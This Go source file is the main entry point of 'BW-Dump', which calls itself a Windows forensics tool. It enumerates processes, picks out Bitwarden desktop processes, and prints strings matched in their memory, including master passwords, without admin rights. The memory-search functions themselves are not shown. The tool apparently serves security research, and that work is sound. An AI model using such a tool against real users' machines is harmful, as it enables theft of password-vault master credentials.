package main

import (
	"flag"
	"fmt"
	"log"

	"github.com/shirou/gopsutil/v3/process"
)

var dumpMemoryOption, verboseOption bool

func init() {
	flag.BoolVar(&dumpMemoryOption, "d", false, "dump memory regions to current directory (may not work)")
	flag.BoolVar(&verboseOption, "v", false, "show all discoverd strings (might show password)")
	flag.Parse()
}

func main() {

	fmt.Print(`
 888 88b, Y8b Y8b Y888P    888 88e                                 
 888 88P'  Y8b Y8b Y8P     888 888b  8888 8888 888 888 8e  888 88e 
 888 8K     Y8b Y8b Y  888 888 8888D 8888 8888 888 888 88b 888 888b
 888 88b,    Y8b Y8b       888 888P  Y888 888P 888 888 888 888 888P
 888 88P'     Y8P Y        888 88"    "88 88"  888 888 888 888 88" 
                                                           888     
            Created by @NazMarkuta at Red Maple            888   v1.0.2    
`)
	fmt.Println()
	fmt.Printf("BW-Dump is a Windows forensics tool that extracts Bitwarden master passwords from locked vaults\n(must be unlocked at least once) by reading process memory using Windows API functions which\nsearches for magic byte patterns. The tool doesn't require any special (admin) permissions.\n\n")
	fmt.Printf("Supports Windows 10 & 11 with:\n")
	fmt.Printf(" - Bitwarden Desktop App (v2023.2.0)\n\n")

	// Search through all (accessible) processes on the system
	fmt.Printf("[+] Searching for processes...\n")

	procList, err := process.Processes()
	if err != nil {
		log.Fatalf("[!] Cannot retrieve list of processes: %s", err.Error())
	}

	// Get a list of target processes
	targetProcs, err := getFilteredProcs(procList)
	if err != nil {
		log.Fatalf("[!] No supported processes found!")
	}

	// Search each targetProcs process memory
	for i := range targetProcs {
		p := targetProcs[i]
		fmt.Println("[+] PID:", p.pidInt)
		fmt.Println("[+] EXEName:", p.exeName)
		fmt.Println("[+] CMDLine:", p.cmdLine)

		results, _ := searchProcessMemory(int(p.pidInt), p.exeName)
		// 248 for chrome
		if len(results) == 0 {
			fmt.Printf("[!] Nothing found.\n\n")
			continue
		}

		fmt.Printf("[+] Results: \n\n")
		for _, result := range results {

			for i := 1; i < len(result); i++ {
				// Shows too many results
				//fmt.Printf("[+] %s\n", result[i].str)
				fmt.Printf("[mem region: 0x%x] [%d] => %s\n", result[i].memRegion, result[i].index, result[i].str)

				// Compare string with previous occurrence, as the
				// Bitwarden master password is repeated several times
				//if strings.Contains(result[i].str, result[i-1].str[0:8]) && len(result[i].str) < 40 {
				// Show memory region location
				//	fmt.Printf("[mem region: 0x%x [%d] => %s\n", result[i].memRegion, result[i].index, result[i].str)
				//}
			}
		}
	}

	if !verboseOption {
		fmt.Println("\n[+] Note: Try use (-v) option to view all matched strings")
	}
	fmt.Println()
}
